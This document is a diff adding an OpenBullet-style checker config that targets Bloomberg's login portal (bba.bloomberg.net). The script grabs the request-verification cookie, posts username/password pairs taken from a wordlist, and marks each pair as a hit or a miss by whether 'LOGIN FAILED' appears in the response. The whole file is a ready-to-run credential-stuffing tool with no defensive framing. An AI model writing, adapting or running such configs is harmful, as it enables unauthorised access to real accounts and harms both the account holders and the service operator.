@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "Bloombergterminal",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-16T12:37:13.6388027+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#get REQUEST GET "https://bba.bloomberg.net/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(__RequestVerificationToken_Lw__)>" LR "" "" Recursive=FALSE -> VAR "token" "" "" 
+#post REQUEST POST "https://bba.bloomberg.net/" AutoRedirect=TRUE 
+  CONTENT "__RequestVerificationToken=<token>&Username=<USER>&Password=<PASS>&IsClientInstalled=False&IsPluginLoaded=False&IsEmbedAllowed=False&ClientVersion=&DetectedRegionKey=EU&SelectedRegionKey=EU" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://bba.bloomberg.net/?utm_source=bloomberg-menu&utm_medium=terminal" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "LOGIN FAILED" 
+  KEYCHAIN Failure OR 
+    KEY "LOGIN FAILED" 
